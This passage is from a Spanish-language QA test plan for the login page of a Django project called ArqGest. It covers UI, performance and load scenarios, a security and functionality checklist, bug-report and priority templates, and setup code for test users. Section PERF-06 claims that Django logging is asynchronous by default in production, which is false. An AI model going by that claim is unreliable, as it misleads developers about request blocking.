4. Verificar si mensaje persiste

**Resultado esperado:**
- ❌ Mensaje de error **no** debe desaparecer al escribir
- ✅ Mensaje persiste hasta nuevo submit
- O implementar limpieza con JS al modificar inputs

---

### UI-07: Animaciones y Transiciones✅ 

**Elementos animados:**
1. Fade-in del formulario al cargar
2. Shake animation en error de login
3. Spinner/loading en botón de submit
4. Transición suave de mensajes de alerta

**Verificación:**
- Animaciones fluidas (60fps)
- No causan layout shift
- Respetan `prefers-reduced-motion` para accesibilidad

---

### UI-08: Branding y Estética✅ 

**Elementos visuales:**
1. Logo de ArqGest centrado
2. Nombre de la app: "ArqGest"
3. Tagline: "Gestión de Proyectos Arquitectónicos"
4. Esquema de colores consistente
5. Tipografía legible

**Verificación:**
- Versión del logo actualizada: `?v={{ STATIC_VERSION }}`
- Imagen no se puede arrastrar: `draggable="false"`

---

### UI-09: Indicadores de Carga✅ 

**Pasos:**
1. Click en "Iniciar Sesión"
2. Observar durante procesamiento

**Resultado esperado:**
- ✅ Botón deshabilitado inmediatamente
- ✅ Texto cambia a "Iniciando sesión..." o spinner
- ✅ Cursor cambia a `wait` o `progress`
- ✅ Previene doble submit

---

### UI-10: Links y Navegación✅ 

**Elementos interactivos:**

| Elemento | Destino | Comportamiento |
|----------|---------|---------------|
| "¿Olvidaste tu contraseña?" | `/accounts/password_reset/` | Navegación normal |
| Logo ArqGest (opcional) | `/` o login | Click en logo |
| "Iniciar Sesión" (botón) | POST a login | Submit form |

**Verificar:**
- Links tienen `href` correcto
- Hover states visibles
- Color de links accesible (contraste WCAG AA)

---

## ⚡ ESCENARIOS DE RENDIMIENTO

### PERF-01: Tiempo de Carga de Página

**Objetivo:** Página de login debe cargar rápido

**Pasos:**
1. Abrir DevTools → Network
2. Recargar `/accounts/login/`
3. Medir tiempo total

**Métricas esperadas:**
- ⏱️ DOMContentLoaded: <500ms
- ⏱️ Load completo: <1s
- ⏱️ First Contentful Paint: <300ms
- ⏱️ Largest Contentful Paint: <800ms

---

### PERF-02: Tiempo de Respuesta de Login

**Pasos:**
1. Ingresar credenciales válidas
2. Click submit
3. Medir tiempo hasta redirección

**Resultado esperado:**
- ⏱️ <500ms en promedio
- ⏱️ <1s en peor caso

**Factores:**
- Consulta a BD (select_related optimizado)
- Generación de session
- Logging (asíncrono si es posible)

---

### PERF-03: Queries de Base de Datos

**Objetivo:** Minimizar consultas N+1

**Pasos:**
1. Activar Django Debug Toolbar
2. Hacer login
3. Revisar panel de SQL queries

**Resultado esperado:**
- ✅ Máximo 3-5 queries:
  1. SELECT user WHERE email = ...
  2. SELECT organization WHERE id = ...
  3. INSERT session
  4. UPDATE user.last_login
- ✅ Uso de `select_related('organization')`

---

### PERF-04: Caché de Static Files

**Verificación:**
1. Primera carga de login → descargar CSS/JS
2. Recargar página (F5)
3. Verificar en Network

**Resultado esperado:**
- ✅ 2ª carga: archivos desde cache (Status 304 o `from cache`)
- ✅ Headers de cache configurados:
  ```http
  Cache-Control: max-age=31536000
  ```
- ✅ WhiteNoise configurado para cache busting

---

### PERF-05: Tamaño de Assets

**Límites recomendados:**
- CSS total: <100KB (comprimido)
- JS total: <150KB (comprimido)
- Imágenes: Logo <50KB (optimizar con TinyPNG)
- Fuentes: Solo cargar pesos necesarios

**Herramientas:**
- Lighthouse en DevTools
- WebPageTest.org

---

### PERF-06: Logging - Sin Bloqueo

**Objetivo:** Verificar que logging no ralentiza requests

**Configuración actual:**
- Logs van a archivos: `logs/app.log`, `logs/security.log`
- Rotación diaria

**Verificación:**
- El request no debe bloquearse esperando escritura de log
- Django logging es asíncrono por defecto en producción

---

### PERF-07: Estrés - Logins Concurrentes

**Objetivo:** Simular múltiples usuarios simultáneos

**Herramientas:**
- Apache JMeter
- Locust.io

**Prueba:**
1. Simular 100 usuarios simultáneos
2. Cada uno hace login
3. Medir tiempos de respuesta

**Resultado esperado:**
- ✅ 95% de requests <1s
- ✅ 0% de errores 500
- ✅ Sistema responde bajo carga

---

## ✅ CHECKLIST DE PRUEBAS

### Funcionalidad Básica
- [ ] Login exitoso con credenciales válidas
- [ ] Login fallido con email incorrecto
- [ ] Login fallido con password incorrecta
- [ ] Logout exitoso
- [ ] Opción "Recordarme" funciona
- [ ] Redirección post-login correcta

### Seguridad
- [ ] Protección contra fuerza bruta (10 intentos → bloqueo)
- [ ] CSRF token presente y validado
- [ ] XSS prevention (inputs escapados)
- [ ] SQL Injection prevention
- [ ] Session fixation prevention
- [ ] Password no se loguea
- [ ] Mensajes de error no revelan info sensible
- [ ] HTTPS en producción
- [ ] Cookies con flags seguros (HttpOnly, Secure, SameSite)

### Validación
- [ ] Email requerido
- [ ] Password requerido
- [ ] Email con formato válido
- [ ] Cuenta inactiva bloqueada
- [ ] Normalización de email (lowercase)
- [ ] Contraseña case-sensitive

### Control de Acceso
- [ ] Superuser redirige a /admin/
- [ ] Org admin tiene log adicional
- [ ] Usuario sin org puede loguear
- [ ] Force password change funciona
- [ ] Middleware bloquea rutas correctamente

### Sesión
- [ ] Duración 7 días por defecto
- [ ] Duración 30 días con "Recordarme"
- [ ] Sesión persiste al cerrar navegador
- [ ] Múltiples sesiones simultáneas
- [ ] Flags de sesión se limpian

### Password Reset
- [ ] Email enviado a usuario válido
- [ ] Email no revela si usuario no existe
- [ ] Rate limiting funciona (15 min)
- [ ] Token expira en 1 hora
- [ ] Token de un solo uso
- [ ] Validación de nueva contraseña

### UI/UX
- [ ] Responsive en móvil
- [ ] Toggle de mostrar/ocultar password
- [ ] Navegación con teclado
- [ ] Accesible con lector de pantalla
- [ ] Mensajes de error claros
- [ ] Animaciones suaves
- [ ] Indicadores de carga

### Rendimiento
- [ ] Página carga en <1s
- [ ] Login procesa en <500ms
- [ ] Queries optimizadas (≤5)
- [ ] Static files en caché
- [ ] Assets comprimidos

### Logging
- [ ] Login exitoso loguea evento
- [ ] Login fallido loguea con motivo
- [ ] Superuser login nivel WARNING
- [ ] Org admin login adicional
- [ ] Logout loguea
- [ ] Password reset loguea
- [ ] No se loguean contraseñas

---

## 📊 REPORTE DE BUGS

### Plantilla para Reportar

```markdown
**Bug ID:** BUG-LOGIN-001
**Fecha:** 05/11/2025
**Severidad:** Alta | Media | Baja | Crítica
**Prioridad:** P0 | P1 | P2 | P3

**Descripción:**
[Descripción breve del problema]

**Pasos para Reproducir:**
1. 
2. 
3. 

**Resultado Esperado:**
[Qué debería pasar]

**Resultado Actual:**
[Qué pasó realmente]

**Evidencia:**
- Screenshots
- Logs relevantes
- Network requests

**Entorno:**
- Navegador: Chrome 120
- OS: Windows 11
- Dispositivo: Desktop / Mobile
- URL: https://...

**Impacto:**
[Cuántos usuarios afecta, qué funcionalidad rompe]
```

---

## 🎯 PRIORIZACIÓN DE PRUEBAS

### Críticas (P0) - Bloqueantes de Release
- SEG-01: Protección contra fuerza bruta
- SEG-04: CSRF Protection
- ACC-01: Cuenta inactiva bloqueada
- HP-01: Login exitoso básico
- HP-05: Logout exitoso

### Altas (P1) - Antes de Release
- SEG-03: XSS Prevention
- SEG-08: Brute force en password reset
- PWD-01: Password reset happy path
- ACC-06: Force password change
- VD-04, VD-05: Validación de credenciales

### Medias (P2) - Después de Release
- UI-03, UI-04: Accesibilidad
- PERF-01-03: Rendimiento básico
- SES-03-05: Escenarios de sesión
- VD-08-10: Edge cases de validación

### Bajas (P3) - Mejora Continua
- UI-07: Animaciones
- PERF-05: Tamaño de assets
- UI-08: Branding
- VD-09: Caracteres especiales raros

---

## 📝 NOTAS FINALES

### Configuración de Entorno de Pruebas

**Variables de entorno requeridas:**
```bash
DEBUG=True  # Solo en desarrollo
SECRET_KEY=<secret>
DATABASE_URL=<url>
ALLOWED_HOSTS=localhost,127.0.0.1
EMAIL_BACKEND=django.core.mail.backends.console.EmailBackend  # Para desarrollo
```

**Usuarios de prueba:**
```python
# Crear con Django shell
from django.contrib.auth import get_user_model
User = get_user_model()

# Usuario normal
user = User.objects.create_user(
    email='test@example.com',
    password='TestPass123!',
    first_name='Test',
    last_name='User'
)

# Superuser
admin = User.objects.create_superuser(
    email='admin@example.com',
    password='AdminPass123!',
    first_name='Admin',
    last_name='User'
)

# Org admin
org_admin = User.objects.create_user(
    email='orgadmin@example.com',
    password='OrgPass123!',
    first_name='Org',
    last_name='Admin',
    is_org_admin=True
)
```

### Herramientas Recomendadas

1. **Navegadores:** Chrome, Firefox, Safari, Edge
2. **DevTools:** Network, Console, Application (Cookies)
3. **Extensiones:** 
   - WAVE (accesibilidad)
   - axe DevTools (accesibilidad)
   - Lighthouse (performance)
4. **Testing de API:** Postman, cURL
5. **Monitoreo:** Django Debug Toolbar

### Referencias de Código

**Archivos clave:**
- `arc_manager/apps/accounts/views.py` → CustomLoginView
- `arc_manager/apps/accounts/forms.py` → CustomAuthenticationForm
- `arc_manager/apps/accounts/middleware.py` → Middlewares de seguridad
- `arc_manager/core/settings.py` → Configuración de sesión y seguridad
- `arc_manager/apps/accounts/templates/auth/login.html` → Template

---

**Última actualización:** 05/11/2025  
**Versión del documento:** 1.0  
**Preparado por:** GitHub Copilot  
**Estado:** Listo para Testing
